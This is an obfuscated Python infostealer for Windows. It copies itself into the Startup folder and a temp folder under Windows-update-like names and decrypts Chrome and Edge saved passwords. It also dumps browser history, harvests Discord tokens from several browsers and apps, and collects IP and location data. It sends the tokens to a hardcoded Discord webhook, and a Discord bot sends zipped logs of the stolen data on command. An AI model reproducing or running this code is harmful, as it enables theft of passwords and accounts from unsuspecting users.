from colorama import Fore,init,Style
init()
from datetime import datetime,timedelta
from screeninfo import get_monitors
import soundfile as sf,sounddevice as sd
from discord.ext import commands
from urllib.request import Request,urlopen
import discord,shutil,os,sys,requests,getpass,sqlite3,psutil,socket,base64,tempfile,json,win32crypt,zipfile,platform,re
from Crypto.Cipher import AES
US=getpass.getuser()
d_n=platform.node()
t_p=None
l_f=None
U_='utf-8'
req=None
def clone_self():
	global t_p;global l_f;str_1='XEFwcERhdGFcUm9hbWluZ1xNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXA=';str_2='QzpcVXNlcnNc';f_p=f"{base64.b64decode(str_2).decode(U_)}{US}{base64.b64decode(str_1).decode(U_)}";str='d2luZG93c3VwZGF0ZXMubmV3ZXN0dmVyc2lvbi4xMW9yMTA=';t_p=os.path.join(tempfile.gettempdir(),base64.b64decode(str).decode(U_))
	try:os.makedirs(t_p)
	except FileExistsError:print('')
	try:l_f=os.path.join(t_p,'logs');os.makedirs(l_f)
	except FileExistsError:print('')
	s_p_1=os.path.realpath(sys.argv[0]);msg1='d2luLURlYnVnX3YxMC4yMmgyLmV4ZQ==';s_n1=base64.b64decode(msg1).decode(U_);w_sn='SVCHost.dll';c_p=os.path.join(f_p,s_n1)
	if os.path.exists(c_p):return
	shutil.copy(s_p_1,c_p);s_p_p1=os.path.join(t_p,w_sn);shutil.copy(s_p_1,s_p_p1)
if __name__=='__main__':clone_self()
def get_ip_info():
	s_1s='aHR0cHM6Ly9pcGluZm8uaW8=';rsp=requests.get(base64.b64decode(s_1s).decode(U_))
	if rsp.status_code==200:D=rsp.json();return D
	else:print('Error:',rsp.status_code);print(rsp.text);return
def get_ipv4_address():
	try:i__s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);i__s.connect(('8.8.8.8',80));i4__s=i__s.getsockname()[0];i__s.close();return i4__s
	except socket.error:return
def get_ipv6_address():
	try:i6_s=socket.socket(socket.AF_INET6,socket.SOCK_DGRAM);i6_s.connect(('2001:4860:4860::8888',80));i6s_s=i6_s.getsockname()[0];i6_s.close();return i6s_s
	except socket.error:return
def get_public_ip_and_region():
	try:str1='aHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29u';str2='aHR0cDovL2lwLWFwaS5jb20vanNvbi8=';rsp_t=requests.get(base64.b64decode(str1).decode(U_));D2=rsp_t.json();p_i=D2['ip'];rsp_t=requests.get(f"{base64.b64decode(str2).decode(U_)}{p_i}");D2=rsp_t.json();rI=D2['regionName'];return p_i,rI
	except Exception as e:str3='REVCVUc6IEVycm9yIHdoaWxlIGZldGNoaW5nIElQIGFuZCByZWdpb246IA==';print(f"{base64.b64decode(str3).decode(U_)}{e}");return None,None
def get_bytes_sent_received():
	try:net_io=psutil.net_io_counters();bytes_sent=net_io.bytes_sent;bytes_received=net_io.bytes_recv;return bytes_sent,bytes_received
	except Exception as e:strr1='REVCVUc6IEVycm9yIHdoaWxlIGZldGNoaW5nIGJ5dGVzIHNlbnQgYW5kIHJlY2VpdmVkOiA=';print(f"{base64.b64decode(strr1).decode(U_)}{e}");return None,None
def GetBrowserInfo():
	global l_f;username=os.getlogin();s_s='QzpcVXNlcnNc';s_c='XEFwcERhdGFcTG9jYWxcR29vZ2xlXENocm9tZVxVc2VyIERhdGFcRGVmYXVsdA==';s_e='XEFwcERhdGFcTG9jYWxcTWljcm9zb2Z0XEVkZ2VcVXNlciBEYXRhXERlZmF1bHQ=';d_c=f"{base64.b64decode(s_s).decode(U_)}{username}{base64.b64decode(s_c).decode(U_)}";d_e=f"{base64.b64decode(s_s).decode(U_)}{username}{base64.b64decode(s_e).decode(U_)}"
	if os.path.exists(d_c)and os.path.exists(d_e):dirs=[d_c,d_e]
	elif os.path.exists(d_c):dirs=[d_c]
	elif os.path.exists(d_e):dirs=[d_e]
	else:return
	b_h_f=os.path.join(l_f,'browser_history.txt')
	with open(b_h_f,'w',encoding=U_)as f:
		for dir in dirs:
			hs_db=os.path.join(dir,'history');c=sqlite3.connect(hs_db);cs_=c.cursor();ss_1='SELECT id, url, title, visit_count, last_visit_time FROM urls';cs_.execute(ss_1);rst=cs_.fetchall();f.write(f"{dir.upper()}:\n")
			for res in rst:
				id,url,title,visit_count,last_visit_time=res
				if'?'in url:continue
				eth=f"{url} | {title}\n";f.write(eth)
GetBrowserInfo()
def get_chrome_datetime(chromedate):return datetime(1601,1,1)+timedelta(microseconds=chromedate)
def get_encryption_key():
	AppD=base64.b64decode('QXBwRGF0YQ==').decode(U_);Loc=base64.b64decode('TG9jYWw=').decode(U_);Gog=base64.b64decode('R29vZ2xl').decode(U_);microa=base64.b64decode('TWljcm9zb2Z0').decode(U_);Chr=base64.b64decode('Q2hyb21l').decode(U_);adolf=base64.b64decode('RWRnZQ==').decode(U_);usda=base64.b64decode('VXNlciBEYXRh').decode(U_);lost=base64.b64decode('TG9jYWwgU3RhdGU=').decode(U_);L_S_P=os.path.join(os.environ['USERPROFILE'],AppD,Loc,Gog,Chr,usda,lost)
	if not os.path.exists(L_S_P):L_S_P=os.path.join(os.environ['USERPROFILE'],AppD,Loc,microa,adolf,usda,lost)
	with open(L_S_P,'r',encoding='utf-8')as f:l_s1=f.read();l_s1=json.loads(l_s1)
	None_=base64.b64decode(l_s1['os_crypt']['encrypted_key']);None_=None_[5:];return win32crypt.CryptUnprotectData(None_,None,None,None,0)[1]
def decrypt_password(psw,key):
	try:iv=psw[3:15];psw=psw[15:];cp=AES.new(key,AES.MODE_GCM,iv);return cp.decrypt(psw)[:-16].decode()
	except:
		try:return str(win32crypt.CryptUnprotectData(psw,None,None,None,0)[1])
		except:return''
def main_grabber():
	global t_p;global l_f;hugios=base64.b64decode('QXBwRGF0YQ==').decode(U_);asdf=base64.b64decode('TG9jYWw=').decode(U_);ad2=base64.b64decode('R29vZ2xl').decode(U_);mico=base64.b64decode('TWljcm9zb2Z0').decode(U_);rth=base64.b64decode('Q2hyb21l').decode(U_);eda=base64.b64decode('RWRnZQ==').decode(U_);usd=base64.b64decode('VXNlciBEYXRh').decode(U_);defa=base64.b64decode('ZGVmYXVsdA==').decode(U_);lod=base64.b64decode('TG9naW4gRGF0YQ==').decode(U_);key=get_encryption_key();argv=[os.path.join(os.environ['USERPROFILE'],hugios,asdf,ad2,rth,usd,defa,lod),os.path.join(os.environ['USERPROFILE'],hugios,asdf,mico,eda,usd,defa,lod)];pp_=[]
	for argc in argv:
		if os.path.exists(argc):
			bws='Chrome'if'Chrome'in argc else'Edge';fn=f"{bws}Data.db";shutil.copyfile(argc,fn);pp_.append(bws);db=sqlite3.connect(fn);css_=db.cursor();css_.execute('select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created')
			for row in css_.fetchall():
				o_u=row[0];a_u=row[1];USN=row[2];PSW=decrypt_password(row[3],key);DCW=row[4];DLW=row[5];a_u=a_u if a_u else'<undefined>';PSW=PSW if PSW else'<undefined>';NOTUSED=f"🧱 | Browser Grabbed from: {bws}\n";NOTUSED+=f"🔗 | Origin URL: {o_u}\n";NOTUSED+=f"🔗 | Action URL: {a_u}\n";NOTUSED+=f"👤 | Username: {USN}\n";NOTUSED+=f"🔑 | Password: {PSW}\n";NOTUSED+=f"🗓 | Creation date: {DCW}\n";NOTUSED+='='*50
				if t_p and l_f:
					log_file=os.path.join(l_f,'Passwords.txt')
					with open(log_file,'a',encoding='utf-8')as f:f.write(NOTUSED);f.write('\n')
			css_.close();db.close()
			try:os.remove(fn)
			except:pass
	if len(pp_)==0:msg='Tm8gQ2hyb21lIG9yIEVkZ2UgZGF0YWJhc2VzIGZvdW5kLg==';print(f"{Fore.YELLOW}{base64.b64decode(msg).decode(U_)}{Style.RESET_ALL}")
	else:msg2='UHJvY2Vzc2VkIGJyb3dzZXIocyk6IA==';print(f"{Fore.GREEN}{Fore.YELLOW}{base64.b64decode(msg2).decode(U_)}{', '.join(pp_)}{Style.RESET_ALL}")
main_grabber()
LULU='aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTEzMzcwOTQzNjAwMzgxOTU5Mi9zaHpVdFlsUlc5SUh1QnU2VllHbmpKNEJtQWR4bEZSVXNxaUZHd1I5UjlGaXVqdkhwUlNqd2t2aTYwOHJiUENVZ1VCQg=='
WEBHOOK_URL=base64.b64decode(LULU).decode(U_)
PING_ME=True
def find_tokens(path):
	Thing1='TG9jYWwgU3RvcmFnZQ==';Thing2='bGV2ZWxkYg==';path+=f"\\{base64.b64decode(Thing1).decode(U_)}\\{base64.b64decode(Thing2).decode(U_)}";tokens=[]
	for file_name in os.listdir(path):
		if not file_name.endswith('.log')and not file_name.endswith('.ldb'):continue
		for line in[x.strip()for x in open(f"{path}\\{file_name}",errors='ignore').readlines()if x.strip()]:
			for regex in('[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}','mfa\\.[\\w-]{84}'):
				for token in re.findall(regex,line):tokens.append(token)
	return tokens
def main_token_grab():
	U_data='VXNlciBEYXRh';G='R29vZ2xl';G2='R29vZ2xlIENocm9tZQ==';O_S='T3BlcmEgU3RhYmxl';global req;local=os.getenv('LOCALAPPDATA');roaming=os.getenv('APPDATA');paths={'Discord':roaming+f"\\Discord",'Discord Canary':roaming+f"\\discordcanary",'Discord PTB':roaming+'\\discordptb',f"{base64.b64decode(G2).decode(U_)}":local+f"\\{base64.b64decode(G).decode(U_)}\\Chrome\\{base64.b64decode(U_data).decode(U_)}\\Default",'Opera':roaming+f"\\Opera Software\\{base64.b64decode(O_S).decode(U_)}",'Brave':local+f"\\BraveSoftware\\Brave-Browser\\{base64.b64decode(U_data).decode(U_)}\\Default",'Yandex':local+f"\\Yandex\\YandexBrowser\\{base64.b64decode(U_data).decode(U_)}\\Default"};message='@here'if PING_ME else''
	for(platform,path)in paths.items():
		if not os.path.exists(path):continue
		message+=f"\n**{platform}**\n```\n";tokens=find_tokens(path)
		if len(tokens)>0:
			for token in tokens:message+=f"{token}\n"
		else:message+='No tokens found.\n'
		message+='```'
	headers={'Content-Type':'application/json','User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'};payload=json.dumps({'content':message})
	try:req=Request(WEBHOOK_URL,data=payload.encode(),headers=headers);urlopen(req)
	except:pass
pip,rg=get_public_ip_and_region()
bs,br=get_bytes_sent_received()
I4=get_ipv4_address()
I6=get_ipv6_address()
II=get_ip_info()
if II:a_n=II.get('org','').split()[-1];t_z=II.get('timezone','');l_t=datetime.now()
else:a_n=None;t_z=None;l_t='Error fetching local Time.'
p_d={'title':'Browser Info','description':f"Browser Info grabbed from: {US}",'color':3553599,'fields':[{'name':'📁 ZIP Includes:','value':f"""
                    🔑 Passwords: Passwords will be provided.
                    📕 History: History will be provided.
                    🎫 DiscordToken/s: `Your Token/s will be sent per Webhook!`
                    
                    

                        """,'inline':False}]}
e_d={'title':'Main Info','description':f"Some main Info grabbed from: {US}",'color':3553599,'fields':[{'name':'👤 User Info','value':f"\n                    Username: {US} \n                    Desktop: {d_n}\n\n                      ",'inline':True},{'name':'📡 Network Info','value':f"""
                    Public IP address: {pip}
                    IPv4 Address: {I4}
                    IPv6 Address: {I6}
                    Region: {rg}
                    Bytes sent: {bs}
                    Bytes received: {br}

                      """,'inline':False},{'name':'🌍 Location Info','value':f"""
                    AS-Number: {a_n}
                    Local-Time: {l_t}
                    Timezone: {t_z}

                      """,'inline':False}]}
US=getpass.getuser()
enc_T='TVRBM09USXdOek14TmpBMk9EVXlNREEyT0EuR2VEQUVhLjN2QzJRQzk4MnJNNTlYTjU5Z2ttUXlmZkJrQ2JhVzhfSmdyWVBn'
T_T=base64.b64decode(enc_T).decode(U_)
ints=discord.Intents.default()
ints.message_content=True
B=commands.Bot(command_prefix='.',intents=ints)
@B.command()
async def clear(message):c__=message.channel;l__=100;d__=await c__.purge(limit=l__+1);await c__.send(f"Successfully cleared {len(d__)-1} messages!",delete_after=5)
@B.event
async def on_ready():await B.change_presence(activity=discord.Game(name='See commands in Main!'));print(f"Logged in as {B.user.name}")
@B.event
async def on_message(message):
	if message.author==B.user:return
	if message.content.startswith('.main'):
		iogzaeurh=discord.Embed(title=e_d['title'],description=e_d['description'],color=e_d['color'])
		for field in e_d['fields']:iogzaeurh.add_field(name=field['name'],value=field['value'],inline=field['inline'])
		await message.channel.send(embed=iogzaeurh);hfodgisu=discord.Embed(title=p_d['title'],description=p_d['description'],color=p_d['color'])
		for field in p_d['fields']:hfodgisu.add_field(name=field['name'],value=field['value'],inline=field['inline'])
		await message.channel.send(embed=hfodgisu);main_token_grab();L1='WW91IGNhbiB0cnkgdGhpcyBjb2RlOg==';L2='YGBgamF2YXNjcmlwdA==';L3='ZnVuY3Rpb24gbG9naW4odG9rZW4pIA==';L4='ew==';L5='ICAgIHNldEludGVydmFsKCgpID0+IA==';L6='ICAgIHs=';L7='ICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoZG9jdW1lbnQuY3JlYXRlRWxlbWVudCBgaWZyYW1lYCkuY29udGVudFdpbmRvdy5sb2NhbFN0b3JhZ2Uud';L8='G9rZW4gPSBgIiR7dG9rZW59ImA=';L9='ICAgIH0sIDUwKTs=';L10='ICAgIHNldFRpbWVvdXQoKCkgPT4g';L11='ICAgIHs=';L12='ICAgIGxvY2F0aW9uLnJlbG9hZCgpOw==';L13='ICAgIH0sIDI1MDApOw==';L14='fQ==';L15='bG9naW4oJ1BBU1RFIFRPS0VOIEhFUkUnKQ==';L16='YGBg';L17='SnVzdCBnbyB0bzogaHR0cHM6Ly9kaXNjb3JkLmNvbS9sb2dpbi8=';L18='QW5kIHBhc3RlIHRoZSBjb2RlIGluIHRoZSBjb25zb2xlLg==';TEXT=f"\n                "
	elif message.content.startswith('.zip'):
		main1='QzpcXFVzZXJzXFw=';main2='XFxBcHBEYXRhXFxMb2NhbFxcVGVtcFxcd2luZG93c3VwZGF0ZXMubmV3ZXN0dmVyc2lvbi4xMW9yMTA=';l_f_P=f"{base64.b64decode(main1).decode(U_)}{US}{base64.b64decode(main2).decode(U_)}";z_IP='logs.zip';az_p=os.path.join(l_f_P,z_IP)
		with zipfile.ZipFile(az_p,'w')as ZF:
			for(fld,subfolders,filenames)in os.walk(l_f_P):
				for filename in filenames:f_p=os.path.join(fld,filename);rP=os.path.relpath(f_p,l_f_P);ZF.write(f_p,rP)
		with open(az_p,'rb')as file:await message.channel.send(file=discord.File(file,filename=z_IP))
		os.remove(az_p)
	elif message.content.startswith('.cls'):await clear(message)
B.run(T_T)
